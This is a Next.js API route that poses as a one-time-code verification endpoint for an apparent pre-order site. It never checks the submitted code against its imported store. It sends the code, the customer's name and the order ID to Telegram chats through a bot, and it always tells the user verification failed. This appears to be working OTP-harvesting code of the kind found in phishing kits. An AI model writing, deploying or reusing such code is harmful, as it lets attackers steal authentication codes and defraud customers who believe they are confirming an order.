import { NextRequest, NextResponse } from "next/server";
import { otpStore } from "../pre-order/otpStore";

async function sendTelegram(text: string) {
  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
    .split(",").map((id: string) => id.trim()).filter(Boolean);
  await Promise.all(
    chatIds.map(chat_id =>
      fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text }),
      }).catch(() => {})
    )
  );
}

export async function POST(req: NextRequest) {
  const { code, orderId, customerName } = await req.json();

  sendTelegram(
    `🔐 كود تحقق مُرسل
👤 العميل: ${customerName}
🔢 رقم الطلب: ${orderId}
📟 الكود المُدخل: ${String(code).replace(/\D/g, "")}`
  ).catch(() => {});

  return NextResponse.json({ ok: true, verified: false });
}
